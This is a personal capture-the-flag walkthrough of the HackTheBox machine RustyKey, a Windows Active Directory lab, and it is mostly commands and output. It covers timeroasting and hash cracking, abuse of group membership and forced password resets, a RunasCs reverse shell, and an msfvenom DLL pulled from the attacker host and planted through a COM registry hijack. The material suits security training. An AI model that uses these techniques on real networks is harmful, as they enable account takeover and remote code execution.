# Machine Information

As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A

# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.201.253                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:10 CEST
Nmap scan report for 10.129.201.253
Host is up (0.028s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sCV 10.129.201.253      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 01:15 CEST
Nmap scan report for rustykey.htb (10.129.201.253)
Host is up (0.037s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 00:36:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1h21m16s
| smb2-time: 
|   date: 2025-07-01T00:37:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds
```

Before downloading the data from the LDAP server to put it in Bloodhound, I noticed that the port for the SMB server is open. So I will first check whether I can connect using the user credentials I received from HTB. As you can see below, I will first have to fake ntpdate for the command to work.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k        
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW 

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ sudo ntpdate 10.129.201.23 
2025-07-02 03:27:02.524323 (+0200) +380.487905 +/- 0.007917 10.129.201.23 s1 no-leap
CLOCK: time stepped by 380.487905

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

As you can see above, I can connect to the SMB server with the user credentials. Now I'm going to see if I can use the --rid-brute parameter to retrieve the RIDs of the users within the domain ‘dc.rustykey.htb’. We will be able to use these later.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --rid-brute
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               502: RUSTYKEY\krbtgt (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               512: RUSTYKEY\Domain Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               513: RUSTYKEY\Domain Users (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               514: RUSTYKEY\Domain Guests (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               515: RUSTYKEY\Domain Computers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               516: RUSTYKEY\Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               517: RUSTYKEY\Cert Publishers (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               518: RUSTYKEY\Schema Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               525: RUSTYKEY\Protected Users (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               526: RUSTYKEY\Key Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               1000: RUSTYKEY\DC$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
SMB         dc.rustykey.htb 445    dc               1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1128: RUSTYKEY\HelpDesk (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1130: RUSTYKEY\Protected Objects (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1131: RUSTYKEY\IT (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1132: RUSTYKEY\Support (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1133: RUSTYKEY\Finance (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1136: RUSTYKEY\DelegationManager (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               1137: RUSTYKEY\rr.parker (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1138: RUSTYKEY\mm.turner (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1139: RUSTYKEY\bb.morgan (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1140: RUSTYKEY\gg.anderson (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1143: RUSTYKEY\dd.ali (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1145: RUSTYKEY\ee.reed (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               1146: RUSTYKEY\nn.marcos (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)
```

We have been given a username by HTB. I will use this to retrieve the data from the LDAP server so that I can put it into Bloodhound.

```
bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d rustykey.htb -dc dc.rustykey.htb -ns 10.129.201.253 -c all --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20250701025439_bloodhound.zip
```

I went for this command because the command I always use is not supported.

```
nxc ldap 10.129.201.253 -u rr.parker -p '8#t5HE8L!W3A' --bloodhound --collection All --dns-server 10.129.201.253
LDAP        10.129.201.253  389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.129.201.253  389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

I checked out Bloodhound, but there was nothing there that would help us with the user credentials we already had.

![[Pasted image 20250701195328.png]]

I then looked in Bloodhound for the ‘shortest path to Tier Zero’. There you can see that you can use the user mm.turner to obtain the shortest path to Tier Zero. Since we don't have any user credentials for this user and we can't change them, I will have to find another way to obtain this user. This will probably be through kerberoasting tickets.

First, I will check which encryption is used for the TGS tickets. I did this by using the Impacket `getTGT` tool. With this command, I requested a Kerberos Ticket Granting Ticket (TGT) and saved it in a `.ccache` file.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/rr.parker:'8#t5HE8L!W3A'      
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
```

After executing this command, the program reported that the ticket had been successfully saved in the file rr.parker.ccache.
This allows me to check which encryption type was used for the ticket.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ klist -e -c rr.parker.ccache
Ticket cache: FILE:rr.parker.ccache
Default principal: rr.parker@RUSTYKEY.HTB

Valid starting       Expires              Service principal
07/02/2025 03:47:59  07/02/2025 13:47:59  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
        renew until 07/03/2025 03:45:53, Etype (skey, tkt): DEPRECATED:arcfour-hmac, DEPRECATED:arcfour-hmac
```

Above, you can see that RC4-HMAC encryption was used for kerberoasting. So now I'm going to look for an exploit. I looked up all the exploits you can do with RC4-HMAC encryption, which includes timeroasting, kerberoasting, etc. To do timeroasting, I looked at various tools such as GetUserSPN.py and kerberoast.py, but the tool that surprised me was the nxc tool, which I didn't know had this parameter. For this, I used the following Knowledge article. https://0xss0rz.gitbook.io/0xss0rz/pentest/internal-pentest/timeroast

So, if I execute the command now, I will get the hashes dumped with rid's and I will put them directly into a file.

```
nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k -M timeroast \
| grep '\$sntp-ms\$' \
| awk '{print $(NF-1) $(NF)}' \
| sed 's/^dc//' > timeroast_hashes.txt
```

I had ChatGPT modify the code above so that you get the output in a file as shown below.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ cat timeroast_hashes.txt
$sntp-ms$aa6684ad351b5a4b86d6565d539960f7$1c0111e900000000000a16a94c4f434cec0f06e086f7878be1b8428bffbfcd0aec0f24c17aef474bec0f24c17aef6075
$sntp-ms$349663cbc21ebf8c401cb53d2b6146b9$1c0111e900000000000a16a94c4f434cec0f06e088896213e1b8428bffbfcd0aec0f24c17c812026ec0f24c17c813950
...
```

I will now try to crack the hashes using hashcat. You need to check whether you have the module_31300.so module from hashcat, because if you don't have it, you won't be able to crack them. As you can see below, we have executed the hashcat command. I downloaded the following page to get the correct hashcat. https://hashcat.net/beta/

```
./hashcat-6.2.6/hashcat.bin -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
```

If I now look at the file where the cracked passwords are stored, you can see that a password called Rusty88! has been cracked. If I look at the rid that this hash has been assigned, you can then see that this user is ‘1125: RUSTYKEY\IT-Computer3$’.

```
Cracked password in the file

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ sudo cat ./hashcat-6.2.6/hashcat.potfile
$sntp-ms$2a7045ffc920b734b3cc6bb8b0061cdb$1c0111e900000000000a1e2b4c4f434cec0f06e085ee25e2e1b8428bffbfcd0aec0f2ea659e5cc78ec0f2ea659e60c38:Rusty88!

Check RID

TIMEROAST dc.rustykey.htb 445 dc 1125:$sntp-ms$2a7045ffc920b734b3cc6bb8b0061cdb$1c0111e900000000000a1e2b4c4f434cec0f06e085ee25e2e1b8428bffbfcd0aec0f2ea659e5cc78ec0f2ea659e60c38

Check user that is known to that RID

SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
```

So now that we have the user credentials of the ‘IT-Computer3$’ user, we can check in Bloodhound to see if we can exploit them.

![[Pasted image 20250701234538.png]]

As you can see here, if you are this user, you can add yourself to the helpdesk OU. As you can see below, I am trying to add the user using the ‘net’ tool, but apparently this is not supported either.

```
net rpc group addmem "HelpDesk" "HelpDesk" -U "rustykey.htb"/"IT-Computer3$"%'Rusty88!' -S "dc.rustykey.htb" 
Could not connect to server dc.rustykey.htb
Connection failed: NT_STATUS_NOT_SUPPORTED
```

So I decided to do this using BloodyAD. First, I will request a Kerberos Ticket Granting Ticket (TGT) again, which will be stored in a `.ccache` file, but this time I will do this for the user ‘IT-Computer3$’. Then, using the ccache and bloodyAD tools, I will add the user to that group.

```
└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/IT-Computer3$:'Rusty88!'                                  
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-Computer3$.ccache

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-Computer3$'
[+] IT-Computer3$ added to HELPDESK
```

If we now look in Bloodhound, you can see that the user with the rights we just changed can change the passwords of the following four users.

- bb.morgan
- dd.ali
- gg.anderson
- ee.reed

We can also make ourselves a member of the Protected Objects group, which is a member of the Protected Users group.

![[Pasted image 20250702195707.png]]

Now I will change the password for each user.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password bb.morgan 'Hallo@123'
[+] Password changed successfully!

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password ee.reed 'Hallo@123'
[+] Password changed successfully!

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password gg.anderson 'Hallo@123'
[+] Password changed successfully!

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password dd.ali 'Hallo@123'
[+] Password changed successfully!
```

Now that the users' passwords have been changed, I will run the TGT ticket again for the user bb.morgan. However, as you will see below, we will receive an error message stating that the encryption type is not supported. This means that this command is likely being blocked by the Protected Objects group.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123                       
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

You must remove the Protected Objects group from the users. The DC only allows RC4-HMAC encryption, but the members of the protected users can only login with AES 256 or 128, without removing the group you would always receive the KDC_ERR_ETYPE_NOSUPP error.

![[Pasted image 20250702200839.png]]

I will now remove the IT group from the Protected Objects group by using the following command.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'                               
[-] IT removed from PROTECTED OBJECTS
```

And if we now repeat the command for creating the TGT ticket, you will see that it will now work.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123 -k                                                                                        
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
```

Now I will log in to the Windows machine by first authenticating the Kerberos ticket with the .ccache file I just created. You can do this by using the following command.

```
──(kali㉿kali)-[~/HTB/RustyKey]
└─$ export KRB5CCNAME=bb.morgan.ccache
```

We will now be able to connect to the Windows server without having to provide a password, because the authentication (data) from the file is used.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents>
```

If we go to the Desktop folder, we will see two files there. One of them is a PDF file for internal users, and the other file is the user flag that we have now obtained.

User flag: 1f9c50b4f868d12b441f4188fc9847e2

```
*Evil-WinRM* PS C:\Users\bb.morgan> cd Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> ls


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---         7/2/2025   9:15 AM             34 user.txt


*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> cat user.txt
1f9c50b4f868d12b441f4188fc9847e2
```

I would like to view the PDF file, but first I will need to download it from the Windows server to my own machine. You can do this by using the Download command on the evil-winrm connection.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> download internal.pdf
                                        
Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
                                        
Info: Download successful!
```

As you will see below, bb.morgan informs the support team that **temporary extra access** has been granted to test the **archiving tool (packing and unpacking files)** on shared workstations and to resolve issues. This is being done in response to complaints from the Finance and IT teams. This means that the support team has access to the registry, where they can make adjustments and test things out.

![[Pasted image 20250702204204.png]]

With the information we now have, I will take another look in Bloodhound. I looked at the shortest path from owned objects. Here you can see that the user is already a member of the support group. The goal is to obtain this user so that we can then modify the registry.

![[Pasted image 20250702204957.png]]

First, we will need to remove the support group from the Protected Objects group again. You can see this by looking at the previous Bloodhound photo.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-Computer3$'
[+] IT-Computer3$ added to HELPDESK

┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'Support'
[-] Support removed from PROTECTED OBJECTS
```

Obtaining a TGT ticket.

```
┌──(kali㉿kali)-[~/HTB/RustyKey]
└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/ee.reed:Hallo@123
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```

But as you can see below, I will have to find another way to log in as user ee.reed. I did some research and came across the following page, which uses the runas command. So I will try this by copying the runas.exe tool to the Windows server and executing the command there, setting up a listener from my own machine. https://arttoolkit.github.io/wadcoms/RunasCs/

First, I will need to create the exe file. You can do this by using the command below. You can find this in the file ‘compile_commands.txt’.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload /home/kali/HTB/RustyKey/RunasCs/RunasCs.cs

*Evil-WinRM* PS C:\Users\bb.morgan\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
```

We will now upload this to our connection with the user bb.morgan, and the listener will start on our Linux machine. You will see that we get the connection as user ee.reed.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> .\RunasCs_net2.exe ee.reed Hallo@123 Powershell.exe -r 10.10.16.49:4444
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2ae47e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4936 created in background.

┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
└─$ nc -lvnp 4444                                                     
listening on [any] 4444 ...
connect to [10.10.16.49] from (UNKNOWN) [10.129.199.109] 51724
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed
PS C:\Windows\system32>
```

By using the following command, you can search the registry for entries related to “zip,” such as related files, programs, or components related to ZIP files. I did this using chatgpt and searching the internet.

![[Pasted image 20250702223643.png]]

```
PS C:\> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
```

Now I am going to create a malicious rce dll file, which I will then place in the location shown above, inside a folder that you create yourself.

```
HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
```

We are going to create a malicious file by executing the following command.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.49 LPORT=4444 -f dll -o rce.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: rce.dll
```

Upload file to Win Connection. Before you can upload the file to the Windows server, you will first need to create the tmp folder. Otherwise, the code will say that the path is incorrect because there is no tmp folder on the C drive. You can create the folder on the C drive by simply executing the following command.

```
PS C:\> mkdir tmp
```

```
Kali machine

──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
└─$ python -m http.server 5555               
Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
10.129.35.77 - - [04/Jul/2025 23:08:23] "GET /test4.dll HTTP/1.1" 200 -
10.129.35.77 - - [04/Jul/2025 23:08:42] "GET /test4.dll HTTP/1.1" 200 -
10.129.35.77 - - [04/Jul/2025 23:10:05] "GET /test4.dll HTTP/1.1" 200 -

Win server
PS C:\tmp> Invoke-WebRequest -Uri "http://10.10.16.49:5555/test4.dll" -OutFile "C:\tmp\test4.dll"
```

With this command, I add a registry entry under “HKLM\Software\Classes\CLSID{23170F69-40C1-278A-1000-000100020000}\InprocServer32”. I use the reg add command to set the default value of the ‘/ve’ parameter to the path “C:\tmp\rce.dll”, the ‘/d’ parameter, and the ‘/f’ option forces the change without confirmation.

```
 PS C:\tmp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\tmp\rce.dll" /f  
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\tmp\rce.dll" /f
The operation completed successfully.
```

I tried to establish the connection using msfconsole. To connect the server and your Kali machine, you need to enter the same payload in msfconsole that you used in your msfvenom command to create the .dll file. Your next command will then look like this. But as you can see below, the connection is not established.
```
┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
└─$ msfconsole -q -x "use multi/handler; set payload 
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
lhost => 10.10.16.49
lport => 4444
[*] Started reverse TCP handler on 10.10.16.49:4444
```
I started looking for another solution, and after a lot of research, I decided that I could just use the netcat listener command to establish the connection. I then added the file to the registry.
Now you can see that we have been able to establish a connection with the user mm.turner.

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.49] from (UNKNOWN) [10.129.35.77] 57699
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

